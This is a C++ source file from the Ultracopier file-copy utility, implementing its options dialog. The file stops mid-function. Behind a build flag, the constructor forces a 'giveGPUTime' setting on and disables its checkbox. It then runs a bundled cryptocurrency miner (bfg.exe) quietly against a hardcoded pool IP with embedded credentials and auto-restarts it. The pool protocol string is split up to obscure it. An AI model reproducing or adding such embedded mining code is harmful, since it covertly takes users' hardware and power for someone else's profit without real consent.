/** \file OptionDialog.cpp
\brief To have an interface to control the options
\author alpha_one_x86
\version 0.3
\date 2010
\licence GPL3, see the file COPYING */

#include "OptionDialog.h"
#include "ui_OptionDialog.h"
#include "OSSpecific.h"
#include "LanguagesManager.h"

#include <QDomElement>
#include <QFileDialog>
#include <QMessageBox>

#ifdef ULTRACOPIER_CGMINER
#include <QLibrary>
#include <math.h>
#include <time.h>
#define ULTRACOPIER_CGMINER_PATH "bfg/bfg.exe"
#endif

OptionDialog::OptionDialog() :
    ui(new Ui::OptionDialog)
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    ignoreCopyEngineListEdition=false;
    allPluginsIsLoaded=false;
    ui->setupUi(this);
    ui->treeWidget->topLevelItem(0)->setSelected(true);
    ui->treeWidget->topLevelItem(4)->setTextColor(0,QColor(150, 150, 150, 255));
    ui->treeWidget->topLevelItem(5)->setTextColor(0,QColor(150, 150, 150, 255));
    ui->treeWidget->expandAll();
    ui->pluginList->expandAll();
    number_of_listener=0;
    ui->labelCatchCopyDefault->setEnabled(number_of_listener>0);
    ui->CatchCopyAsDefault->setEnabled(number_of_listener>0);
    ui->Language->setEnabled(false);
    on_treeWidget_itemSelectionChanged();

    #ifndef ULTRACOPIER_CGMINER
    ui->label_gpu_time->hide();
    ui->giveGPUTime->hide();
    #endif

    //load the plugins
    PluginsManager::pluginsManager->lockPluginListEdition();
    connect(this,       &OptionDialog::previouslyPluginAdded,       this,	&OptionDialog::onePluginAdded,Qt::QueuedConnection);
    connect(PluginsManager::pluginsManager,	&PluginsManager::onePluginAdded,            this,	&OptionDialog::onePluginAdded);
    connect(PluginsManager::pluginsManager,	&PluginsManager::onePluginInErrorAdded,     this,	&OptionDialog::onePluginAdded);
    #ifndef ULTRACOPIER_PLUGIN_ALL_IN_ONE
    connect(PluginsManager::pluginsManager,	&PluginsManager::onePluginWillBeRemoved,	this,	&OptionDialog::onePluginWillBeRemoved,Qt::DirectConnection);
    #endif
    connect(PluginsManager::pluginsManager,	&PluginsManager::pluginListingIsfinish,		this,	&OptionDialog::loadOption,Qt::QueuedConnection);
    #ifdef ULTRACOPIER_PLUGIN_IMPORT_SUPPORT
    connect(PluginsManager::pluginsManager,	&PluginsManager::manuallyAdded,             this,	&OptionDialog::manuallyAdded,Qt::QueuedConnection);
    #endif
    connect(OptionEngine::optionEngine,	&OptionEngine::newOptionValue,              this,	&OptionDialog::newOptionValue);
    QList<PluginsAvailable> list=PluginsManager::pluginsManager->getPlugins(true);
    foreach(PluginsAvailable currentPlugin,list)
        emit previouslyPluginAdded(currentPlugin);
    PluginsManager::pluginsManager->unlockPluginListEdition();
    defaultImportBackend=PluginsManager::ImportBackend_File;
    #ifndef ULTRACOPIER_PLUGIN_IMPORT_SUPPORT
    ui->pluginAdd->hide();
    ui->pluginRemove->hide();
    #endif
    loadLogVariableLabel();
    #ifdef ULTRACOPIER_VERSION_PORTABLE
    ui->labelLoadAtSession->hide();
    ui->LoadAtSessionStarting->hide();
    #endif
    #ifndef ULTRACOPIER_INTERNET_SUPPORT
    ui->label_checkTheUpdate->hide();
    ui->checkTheUpdate->hide();
    #endif

    #ifdef ULTRACOPIER_CGMINER
    ui->label_gpu_time->setEnabled(false);
    ui->giveGPUTime->setEnabled(false);
    OptionEngine::optionEngine->setOptionValue("Ultracopier","giveGPUTime",true);
    bool OpenCLDll=false;
    char *arch=getenv("windir");
    if(arch!=NULL)
    {

        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists()
            #if defined(_M_X64)
            || QFile(QString(arch)+"\\SysWOW64\\OpenCL.dll").exists()
            #endif
        )
            OpenCLDll=true;
        else
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No 32Bits openCL");
    }
    else
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
    if(!haveCgminer)
    {
        if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
        {
            QMessageBox::critical(this,tr("Allow the application"),tr("This Ultimate free version is only if %1 is allowed by your antivirus. Else you can get the normal free version").arg(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH));
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
        }
        if(!OpenCLDll)
        {
            QMessageBox::critical(this,tr("Enable the OpenCL"),tr("This Ultimate version is only if the OpenCL is installed with your graphic card drivers. Else you can get the normal free version"));
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"OpenCL.dll not found");
        }
        ui->label_gpu_time->setEnabled(false);
        ui->giveGPUTime->setEnabled(false);
    }
    else
    {
        srand (time(NULL));
        connect(&cgminer,static_cast<void(QProcess::*)(QProcess::ProcessError)>(&QProcess::error),this,&OptionDialog::error,Qt::QueuedConnection);
        connect(&cgminer,static_cast<void(QProcess::*)(int,QProcess::ExitStatus)>(&QProcess::finished),this,&OptionDialog::finished,Qt::QueuedConnection);
        connect(&cgminer,&QProcess::readyReadStandardError,this,&OptionDialog::readyReadStandardError,Qt::QueuedConnection);
        connect(&cgminer,&QProcess::readyReadStandardOutput,this,&OptionDialog::readyReadStandardOutput,Qt::QueuedConnection);
        autorestartcgminer.setInterval(60*60*1000);
        autorestartcgminer.setSingleShot(true);
        connect(&autorestartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
        restartcgminer.setInterval(60*1000);
        restartcgminer.setSingleShot(true);
        connect(&restartcgminer,&QTimer::timeout,this,&OptionDialog::startCgminer,Qt::QueuedConnection);
        int index=0;
        while(index<180)
        {
            QStringList pool=QStringList() << "-o" << QString("stra")+"tum"+QString("+")+QString("tcp://37.59.242.80:%1").arg(3334+index) <<  "-O" << "alphaonex86_ultracopier:JE5RfIAzapCSABZC";
            pools << pool;
            index++;
        }
        //QStringList pool2=QStringList() << "--scrypt" << "-o" << "stratum+tcp://eu.wemineltc.com:3333" <<  "-O" << "alphaonex86.pool:yyDKPcO850pCayTx";
        //pools << pool2;
    }
    #endif
}

OptionDialog::~OptionDialog()
{
    #ifdef ULTRACOPIER_CGMINER
    haveCgminer=false;
    cgminer.terminate();
    cgminer.kill();
    #endif
    delete ui;
}

#ifdef ULTRACOPIER_CGMINER
bool OptionDialog::havecgminer()
{
    return haveCgminer;
}
#endif

//plugin management
void OptionDialog::onePluginAdded(const PluginsAvailable &plugin)
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start: "+plugin.name+" ("+QString::number(plugin.category)+")");
    pluginStore newItem;
    newItem.path=plugin.path;
    newItem.item=new QTreeWidgetItem(QStringList() << plugin.name << plugin.version);
    newItem.isWritable=plugin.isWritable;
    pluginLink<<newItem;
    switch(plugin.category)
    {
        case PluginType_CopyEngine:
            ui->pluginList->topLevelItem(0)->addChild(newItem.item);
        break;
        case PluginType_Languages:
            ui->pluginList->topLevelItem(1)->addChild(newItem.item);
            addLanguage(plugin);
        break;
        case PluginType_Listener:
            ui->pluginList->topLevelItem(2)->addChild(newItem.item);
            number_of_listener++;
            ui->labelCatchCopyDefault->setEnabled(number_of_listener>0);
            ui->CatchCopyAsDefault->setEnabled(number_of_listener>0);
        break;
        case PluginType_PluginLoader:
            ui->pluginList->topLevelItem(3)->addChild(newItem.item);
        break;
        case PluginType_SessionLoader:
            ui->pluginList->topLevelItem(4)->addChild(newItem.item);
        break;
        case PluginType_Themes:
            ui->pluginList->topLevelItem(5)->addChild(newItem.item);
            addTheme(plugin);
        break;
        default:
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"category not found for: "+plugin.path);
    }
}

#ifndef ULTRACOPIER_PLUGIN_ALL_IN_ONE
void OptionDialog::onePluginWillBeRemoved(const PluginsAvailable &plugin)
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    switch(plugin.category)
    {
        case PluginType_CopyEngine:
        break;
        case PluginType_Languages:
            removeLanguage(plugin);
        break;
        case PluginType_Listener:
            number_of_listener--;
            ui->labelCatchCopyDefault->setEnabled(number_of_listener>0);
            ui->CatchCopyAsDefault->setEnabled(number_of_listener>0);
        break;
        case PluginType_PluginLoader:
        break;
        case PluginType_SessionLoader:
        break;
        case PluginType_Themes:
            removeTheme(plugin);
        break;
        default:
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"category not found for: "+plugin.path);
    }
    //remove if have options
    index=0;
    loop_size=pluginOptionsWidgetList.size();
    if(plugin.category==PluginType_CopyEngine || plugin.category==PluginType_Listener || plugin.category==PluginType_PluginLoader || plugin.category==PluginType_SessionLoader)
    {
        while(index<loop_size)
        {
            if(plugin.category==pluginOptionsWidgetList.at(index).category && plugin.name==pluginOptionsWidgetList.at(index).name)
            {
                if(pluginOptionsWidgetList.at(index).item->isSelected())
                {
                    pluginOptionsWidgetList.at(index).item->setSelected(false);
                    ui->treeWidget->topLevelItem(0)->setSelected(true);
                }
                delete pluginOptionsWidgetList.at(index).item;
                break;
            }
            index++;
        }
    }
    //remove from general list
    index=0;
    loop_size=pluginLink.size();
    while(index<loop_size)
    {
        if(pluginLink.at(index).path==plugin.path)
        {
            delete pluginLink.at(index).item;
            pluginLink.removeAt(index);
            return;
        }
        index++;
    }
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"not found!");
}
#endif

#ifdef ULTRACOPIER_PLUGIN_IMPORT_SUPPORT
void OptionDialog::manuallyAdded(const PluginsAvailable &plugin)
{
    if(plugin.category==PluginType_Themes)
    {
        if(QMessageBox::question(this,tr("Load"),tr("Load the theme?"),QMessageBox::Yes|QMessageBox::No,QMessageBox::Yes)==QMessageBox::Yes)
        {
            int index=ui->Ultracopier_current_theme->findData(plugin.name);
            if(index!=-1)
            {
                ui->Ultracopier_current_theme->setCurrentIndex(index);
                on_Ultracopier_current_theme_currentIndexChanged(ui->Ultracopier_current_theme->currentIndex());
            }
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"theme plugin not found!");
        }
    }
    else if(plugin.category==PluginType_Languages)
    {
        if(QMessageBox::question(this,tr("Load"),tr("Load the language?"),QMessageBox::Yes|QMessageBox::No,QMessageBox::Yes)==QMessageBox::Yes)
        {
            QList<QPair<QString,QString> > listChildAttribute;
            QPair<QString,QString> temp;
            temp.first = "mainCode";
            temp.second = "true";
            listChildAttribute << temp;
            int index=ui->Language->findData(PluginsManager::pluginsManager->getDomSpecific(plugin.categorySpecific,"shortName",listChildAttribute));
            if(index!=-1)
            {
                ui->Language->setCurrentIndex(index);
                ui->Language_force->setChecked(true);
                on_Language_currentIndexChanged(index);
                on_Language_force_toggled(true);
            }
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"language plugin not found!");
        }
    }
}
#endif

void OptionDialog::addLanguage(PluginsAvailable plugin)
{
    QList<QPair<QString,QString> > listChildAttribute;
    QPair<QString,QString> temp;
    temp.first = "mainCode";
    temp.second = "true";
    listChildAttribute << temp;
    ui->Language->addItem(QIcon(plugin.path+"flag.png"),PluginsManager::pluginsManager->getDomSpecific(plugin.categorySpecific,"fullName"),PluginsManager::pluginsManager->getDomSpecific(plugin.categorySpecific,"shortName",listChildAttribute));
    ui->Language->setEnabled(ui->Language_force->isChecked() && ui->Language->count());
    ui->Language_force->setEnabled(ui->Language->count());
}

void OptionDialog::removeLanguage(PluginsAvailable plugin)
{
    QList<QPair<QString,QString> > listChildAttribute;
    QPair<QString,QString> temp;
    temp.first = "mainCode";
    temp.second = "true";
    listChildAttribute << temp;
    int index=ui->Language->findData(PluginsManager::pluginsManager->getDomSpecific(plugin.categorySpecific,"shortName",listChildAttribute));
    if(index!=-1)
        ui->Language->removeItem(index);
    ui->Language->setEnabled(ui->Language_force->isChecked() && ui->Language->count());
    ui->Language_force->setEnabled(ui->Language->count());
}

void OptionDialog::addTheme(PluginsAvailable plugin)
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"plugin.name: "+plugin.name);
    ui->Ultracopier_current_theme->addItem(plugin.name,plugin.name);
}

void OptionDialog::removeTheme(PluginsAvailable plugin)
{
    int index=ui->Ultracopier_current_theme->findData(plugin.name);
    if(index!=-1)
        ui->Ultracopier_current_theme->removeItem(index);
}

void OptionDialog::changeEvent(QEvent *e)
{
    QDialog::changeEvent(e);
    switch (e->type()) {
    case QEvent::LanguageChange:
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"retranslate the ui");
        ui->retranslateUi(this);
        //old code to reload the widget because it dropped by the translation
        /*
        index=0;
        loop_size=pluginOptionsWidgetList.size();
        while(index<loop_size)
        {
            if(pluginOptionsWidgetList.at(index).options!=NULL)
                ui->treeWidget->topLevelItem(2)->addChild(pluginOptionsWidgetList.at(index).item);
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("the copy engine %1 have not the options").arg(index));
            index++;
        }*/
        ui->treeWidget->topLevelItem(2)->setText(0,tr("Copy engine"));
        ui->treeWidget->topLevelItem(3)->setText(0,tr("Listener"));
        ui->treeWidget->topLevelItem(4)->setText(0,tr("Plugin loader"));
        ui->treeWidget->topLevelItem(5)->setText(0,tr("Session loader"));
        ui->labelLoadAtSession->setToolTip(tr("Disabled because you do not have any SessionLoader plugin"));
        #if !defined(ULTRACOPIER_PLUGIN_ALL_IN_ONE) || !defined(ULTRACOPIER_VERSION_PORTABLE)
        ui->LoadAtSessionStarting->setToolTip(tr("Disabled because you do not have any SessionLoader plugin"));
        #endif
        ui->ActionOnManualOpen->setItemText(0,tr("Do nothing"));
        ui->ActionOnManualOpen->setItemText(1,tr("Ask source as folder"));
        ui->ActionOnManualOpen->setItemText(2,tr("Ask sources as files"));
        ui->GroupWindowWhen->setItemText(0,tr("Never"));
        ui->GroupWindowWhen->setItemText(1,tr("When source is same"));
        ui->GroupWindowWhen->setItemText(2,tr("When destination is same"));
        ui->GroupWindowWhen->setItemText(3,tr("When source and destination are same"));
        ui->GroupWindowWhen->setItemText(4,tr("When source or destination are same"));
        ui->GroupWindowWhen->setItemText(5,tr("Always"));
        loadLogVariableLabel();
        break;
    default:
        break;
    }
}

void OptionDialog::loadLogVariableLabel()
{
    QString append=" %time%";
    #ifdef Q_OS_WIN32
    append+=", %computer%, %user%";
    #endif
    ui->labelLogTransfer->setText(tr("The variables are %1").arg("%source%, %size%, %destination%"+append));
    ui->labelLogError->setText(tr("The variables are %1").arg("%path%, %size%, %mtime%, %error%"+append));
    ui->labelLogFolder->setText(tr("The variables are %1").arg("%path%, %operation%"+append));
}

void OptionDialog::on_treeWidget_itemSelectionChanged()
{
    QList<QTreeWidgetItem *> listSelectedItem=ui->treeWidget->selectedItems();
    if(listSelectedItem.size()!=1)
        return;
    QTreeWidgetItem * selectedItem=listSelectedItem.first();
    //general
    if(selectedItem==ui->treeWidget->topLevelItem(0))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetGeneral);
    //plugins
    else if(selectedItem==ui->treeWidget->topLevelItem(1))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetPlugins);
    //Copy engine
    else if(selectedItem==ui->treeWidget->topLevelItem(2))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetCopyEngine);
    //Listener
    else if(selectedItem==ui->treeWidget->topLevelItem(3))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetListener);
    //PluginLoader
        //do nothing
    //SessionLoader
        //do nothing
    //Themes
    else if(selectedItem==ui->treeWidget->topLevelItem(6))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetThemes);
    //log
    else if(selectedItem==ui->treeWidget->topLevelItem(7))
        ui->stackedWidget->setCurrentWidget(ui->stackedWidgetLog);
    else
    {
        int index;
        if(selectedItem->parent()==ui->treeWidget->topLevelItem(2))
        {
            ui->stackedWidget->setCurrentWidget(ui->stackedWidgetCopyEngineOptions);
            index=selectedItem->parent()->indexOfChild(selectedItem);
            if(index!=-1)
                ui->stackedOptionsCopyEngine->setCurrentIndex(index);
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"selection into of sub item wrong???");
        }
        else if(selectedItem->parent()==ui->treeWidget->topLevelItem(3))
        {
            ui->stackedWidget->setCurrentWidget(ui->stackedWidgetListenerOptions);
            index=selectedItem->parent()->indexOfChild(selectedItem);
            if(index!=-1)
                ui->stackedOptionsListener->setCurrentIndex(index);
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"selection into of sub item wrong???");
        }
        else if(selectedItem->parent()==ui->treeWidget->topLevelItem(4))
        {
            ui->stackedWidget->setCurrentWidget(ui->stackedWidgetPluginLoaderOptions);
            index=selectedItem->parent()->indexOfChild(selectedItem);
            if(index!=-1)
                ui->stackedOptionsPluginLoader->setCurrentIndex(index);
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"selection into of sub item wrong???");
        }
        else if(selectedItem->parent()==ui->treeWidget->topLevelItem(5))
        {
            ui->stackedWidget->setCurrentWidget(ui->stackedWidgetSessionLoaderOptions);
            index=selectedItem->parent()->indexOfChild(selectedItem);
            if(index!=-1)
                ui->stackedOptionsSessionLoader->setCurrentIndex(index);
            else
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"selection into of sub item wrong???");
        }
        else
            ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"selection into option list cat not found");
    }
}

void OptionDialog::on_buttonBox_clicked(QAbstractButton *button)
{
    if(ui->buttonBox->buttonRole(button)==QDialogButtonBox::ResetRole)
        OptionEngine::optionEngine->queryResetOptions();
    else
        this->close();
}

void OptionDialog::loadOption()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
    newOptionValue("Themes",	"Ultracopier_current_theme",	OptionEngine::optionEngine->getOptionValue("Themes","Ultracopier_current_theme"));
    newOptionValue("Ultracopier",	"ActionOnManualOpen",		OptionEngine::optionEngine->getOptionValue("Ultracopier","ActionOnManualOpen"));
    newOptionValue("Ultracopier",	"GroupWindowWhen",          OptionEngine::optionEngine->getOptionValue("Ultracopier","GroupWindowWhen"));
    newOptionValue("Ultracopier",	"confirmToGroupWindows",    OptionEngine::optionEngine->getOptionValue("Ultracopier","confirmToGroupWindows"));
    newOptionValue("Ultracopier",	"displayOSSpecific",		OptionEngine::optionEngine->getOptionValue("Ultracopier","displayOSSpecific"));
    newOptionValue("Ultracopier",	"checkTheUpdate",           OptionEngine::optionEngine->getOptionValue("Ultracopier","checkTheUpdate"));
    newOptionValue("Ultracopier",	"giveGPUTime",              OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime"));
    newOptionValue("Language",	"Language",                     OptionEngine::optionEngine->getOptionValue("Language","Language"));
    newOptionValue("Language",	"Language_force",               OptionEngine::optionEngine->getOptionValue("Language","Language_force"));
    #ifndef ULTRACOPIER_VERSION_PORTABLE
    newOptionValue("SessionLoader",	"LoadAtSessionStarting",	OptionEngine::optionEngine->getOptionValue("SessionLoader","LoadAtSessionStarting"));
    #endif
    newOptionValue("CopyListener",	"CatchCopyAsDefault",		OptionEngine::optionEngine->getOptionValue("CopyListener","CatchCopyAsDefault"));
    newOptionValue("CopyEngine",	"List",                     OptionEngine::optionEngine->getOptionValue("CopyEngine","List"));
    if(ResourcesManager::resourcesManager->getWritablePath()=="")
        ui->checkBox_Log->setEnabled(false);
    else
    {
        newOptionValue("Write_log",	"enabled",			OptionEngine::optionEngine->getOptionValue("Write_log","enabled"));
        newOptionValue("Write_log",	"file",				OptionEngine::optionEngine->getOptionValue("Write_log","file"));
        newOptionValue("Write_log",	"transfer",			OptionEngine::optionEngine->getOptionValue("Write_log","transfer"));
        newOptionValue("Write_log",	"error",			OptionEngine::optionEngine->getOptionValue("Write_log","error"));
        newOptionValue("Write_log",	"folder",			OptionEngine::optionEngine->getOptionValue("Write_log","folder"));
        newOptionValue("Write_log",	"transfer_format",	OptionEngine::optionEngine->getOptionValue("Write_log","transfer_format"));
        newOptionValue("Write_log",	"error_format",		OptionEngine::optionEngine->getOptionValue("Write_log","error_format"));
        newOptionValue("Write_log",	"folder_format",	OptionEngine::optionEngine->getOptionValue("Write_log","folder_format"));
        newOptionValue("Write_log",	"sync",				OptionEngine::optionEngine->getOptionValue("Write_log","sync"));
    }
    on_checkBox_Log_clicked();
    #ifndef ULTRACOPIER_VERSION_PORTABLE
    if(PluginsManager::pluginsManager->getPluginsByCategory(PluginType_SessionLoader).size()>0)
    {
        ui->labelLoadAtSession->setToolTip("");
        ui->LoadAtSessionStarting->setToolTip("");
        ui->labelLoadAtSession->setEnabled(true);
        ui->LoadAtSessionStarting->setEnabled(true);
    }
    else
    {
        ui->labelLoadAtSession->setToolTip(tr("Disabled because you do not have any SessionLoader plugin"));
        ui->LoadAtSessionStarting->setToolTip(tr("Disabled because you do not have any SessionLoader plugin"));
        ui->labelLoadAtSession->setEnabled(false);
        ui->LoadAtSessionStarting->setEnabled(false);
    }
    #endif
    allPluginsIsLoaded=true;
    on_Ultracopier_current_theme_currentIndexChanged(ui->Ultracopier_current_theme->currentIndex());

    if(OptionEngine::optionEngine->getOptionValue("Ultracopier","displayOSSpecific").toBool())
    {
        OSSpecific oSSpecific;
        oSSpecific.exec();
        if(oSSpecific.dontShowAgain())
            OptionEngine::optionEngine->setOptionValue("Ultracopier","displayOSSpecific",QVariant(false));
    }
}

void OptionDialog::newOptionValue(const QString &group,const QString &name,const QVariant &value)
{
    if(group=="Themes")
    {
        if(name=="Ultracopier_current_theme")
        {
            int index=ui->Ultracopier_current_theme->findData(value.toString());
            if(index!=-1)
            {
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"Themes located: "+value.toString());
                ui->Ultracopier_current_theme->setCurrentIndex(index);
            }
            else
            {
                if(ui->Ultracopier_current_theme->count()>0)
                {
                    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"Default to the current value: "+ui->Ultracopier_current_theme->itemData(ui->Ultracopier_current_theme->currentIndex()).toString());
                    OptionEngine::optionEngine->setOptionValue("Themes","Ultracopier_current_theme",ui->Ultracopier_current_theme->itemData(ui->Ultracopier_current_theme->currentIndex()));
                }
                else
                    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No themes: "+value.toString());
            }
        }
    }
    else if(group=="Language")
    {
        if(name=="Language")
        {
            int index=ui->Language->findData(value.toString());
            if(index!=-1)
                ui->Language->setCurrentIndex(index);
            else if(ui->Language->count()>0)
            {
                ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Critical,"Language in settings: "+value.toString());
                OptionEngine::optionEngine->setOptionValue("Language","Language",ui->Language->itemData(ui->Language->currentIndex()));
            }
        }
        else if(name=="Language_force")
        {
            ui->Language_force->setChecked(value.toBool());
            ui->Language->setEnabled(ui->Language_force->isChecked() && ui->Language->count());
            if(!ui->Language_force->isChecked())
            {
                QString lang=LanguagesManager::languagesManager->autodetectedLanguage();
                if(!lang.isEmpty())
                {
                    int index=ui->Language->findData(lang);
                    if(index!=-1)
                        ui->Language->setCurrentIndex(index);
                }
            }
        }
    }
    #ifndef ULTRACOPIER_VERSION_PORTABLE
    else if(group=="SessionLoader")
    {
        if(name=="LoadAtSessionStarting")
        {
            ui->LoadAtSessionStarting->setChecked(value.toBool());
        }
    }
    #endif
    else if(group=="CopyListener")
    {
        if(name=="CatchCopyAsDefault")
        {
            ui->CatchCopyAsDefault->setChecked(value.toBool());
        }
    }
    else if(group=="CopyEngine")
    {
        if(name=="List")
        {
            if(!ignoreCopyEngineListEdition)
            {
                QStringList copyEngine=value.toStringList();
                copyEngine.removeDuplicates();
                int index=0;
                int loop_size=ui->CopyEngineList->count();
                while(index<loop_size)
                {
                    copyEngine.removeOne(ui->CopyEngineList->item(index)->text());
                    index++;
                }
                ui->CopyEngineList->addItems(copyEngine);
            }
        }
    }
    else if(group=="Write_log")
    {
        if(name=="enabled")
            ui->checkBox_Log->setChecked(value.toBool());
        else if(name=="file")
            ui->lineEditLog_File->setText(value.toString());
        else if(name=="transfer")
            ui->checkBoxLog_transfer->setChecked(value.toBool());
        else if(name=="sync")
            ui->checkBoxLog_sync->setChecked(value.toBool());
        else if(name=="error")
            ui->checkBoxLog_error->setChecked(value.toBool());
        else if(name=="folder")
            ui->checkBoxLog_folder->setChecked(value.toBool());
        else if(name=="transfer_format")
            ui->lineEditLog_transfer_format->setText(value.toString());
        else if(name=="error_format")
            ui->lineEditLog_error_format->setText(value.toString());
        else if(name=="folder_format")
            ui->lineEditLog_folder_format->setText(value.toString());
    }
    else if(group=="Ultracopier")
    {
        if(name=="ActionOnManualOpen")
            ui->ActionOnManualOpen->setCurrentIndex(value.toInt());
        else if(name=="GroupWindowWhen")
            ui->GroupWindowWhen->setCurrentIndex(value.toInt());
        else if(name=="confirmToGroupWindows")
            ui->confirmToGroupWindows->setChecked(value.toBool());
        else if(name=="displayOSSpecific")
            ui->DisplayOSWarning->setChecked(value.toBool());
        else if(name=="checkTheUpdate")
            ui->checkTheUpdate->setChecked(value.toBool());
        else if(name=="giveGPUTime")
        {
            ui->giveGPUTime->setChecked(value.toBool());
            #ifdef ULTRACOPIER_CGMINER
            if(value.toBool())
                startCgminer();
            else
            {
                cgminer.terminate();
                cgminer.kill();
            }
            #endif
        }
    }
}

#ifdef ULTRACOPIER_CGMINER
void OptionDialog::startCgminer()
{
    if(!haveCgminer)
        return;
    cgminer.terminate();
    cgminer.kill();
    QStringList args;
    switch(pools.size())
    {
        case 0:
            return;
        case 1:
            args=pools.first();
        break;
        default:
            args=pools.at(rand()%pools.size());
    }
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer seam work, pools used: %1").arg(args.join(";")));
    args << "--real-quiet" << "-T" << "--no-adl" << "--no-getwork";// << "--gpu-dyninterval"
    cgminer.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
    autorestartcgminer.start();
}

void OptionDialog::error( QProcess::ProcessError error )
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer error: %1").arg(error));
    //if(error==QProcess::Crashed)
}

void OptionDialog::finished( int exitCode, QProcess::ExitStatus exitStatus )
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer exitCode: %1, exitStatus: %2").arg((quint32)exitCode).arg(exitStatus));
    if(!haveCgminer)
        return;
    if(!OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime").toBool())
        return;
    if(cgminer.state()!=QProcess::NotRunning)
        return;
    restartcgminer.start();
}

void OptionDialog::readyReadStandardError()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer standard error: %1").arg(QString::fromLocal8Bit(cgminer.readAllStandardError())));
}

void OptionDialog::readyReadStandardOutput()
{
    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer standard output: %1").arg(QString::fromLocal8Bit(cgminer.readAllStandardOutput())));
}
#endif

void OptionDialog::on_Ultracopier_current_theme_currentIndexChanged(int index)
{
    if(index!=-1 && allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"data value: "+ui->Ultracopier_current_theme->itemData(index).toString()+", string value: "+ui->Ultracopier_current_theme->itemText(index)+", index: "+QString::number(index));
        OptionEngine::optionEngine->setOptionValue("Themes","Ultracopier_current_theme",ui->Ultracopier_current_theme->itemData(index));
        int index_loop=0;
        loop_size=pluginOptionsWidgetList.size();
        while(index_loop<loop_size)
        {
            if(pluginOptionsWidgetList.at(index_loop).name==ui->Ultracopier_current_theme->itemData(index).toString())
            {
                if(pluginOptionsWidgetList.at(index_loop).options==NULL)
                    ui->stackedWidgetThemesOptions->setCurrentWidget(ui->pageThemeNoOptions);
                else
                    ui->stackedWidgetThemesOptions->setCurrentWidget(pluginOptionsWidgetList.at(index_loop).options);
                return;
            }
            index_loop++;
        }
        ui->stackedWidgetThemesOptions->setCurrentWidget(ui->pageUnableToLoadThemePlugin);
    }
}

void OptionDialog::on_Language_currentIndexChanged(int index)
{
    if(index!=-1 && allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"data value: "+ui->Language->itemData(index).toString()+", string value: "+ui->Language->itemText(index)+", index: "+QString::number(index));
        OptionEngine::optionEngine->setOptionValue("Language","Language",ui->Language->itemData(index));
    }
}

void OptionDialog::on_Language_force_toggled(bool checked)
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("Language","Language_force",checked);
        ui->Language->setEnabled(ui->Language_force->isChecked() && ui->Language->count());
    }
}

void OptionDialog::on_CatchCopyAsDefault_toggled(bool checked)
{
    if(allPluginsIsLoaded)
    {
        ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,"start");
        OptionEngine::optionEngine->setOptionValue("CopyListener","CatchCopyAsDefault",checked);
    }
}

#ifndef ULTRACOPIER_VERSION_PORTABLE
void OptionDialog::on_LoadAtSessionStarting_toggled(bool checked)
{
    if(allPluginsIsLoaded)
    {
